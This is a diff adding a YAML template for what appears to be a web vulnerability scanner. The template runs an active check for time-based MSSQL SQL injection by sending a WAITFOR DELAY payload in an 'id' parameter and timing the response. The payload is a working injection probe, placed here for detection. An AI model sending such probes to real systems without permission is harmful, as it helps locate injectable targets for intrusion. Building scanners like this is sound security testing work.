@@ -1,0 +1,19 @@
+id: patt-sqli-mssql-time-01-id
+name: 'PATT sqli patt-sqli-mssql-time-01 via id'
+severity: high
+type: active
+tags:
+  - sqli
+  - patt
+requires:
+  - dotnet
+description: 'PATT MSSQL time-based WAITFOR DELAY. [patt:patt-sqli-mssql-time-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MSSQL%20Injection.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      id:
+        - ''' WAITFOR DELAY ''0:0:3''-- -'
+    matchers:
+      - type: time
+        ms: 2500
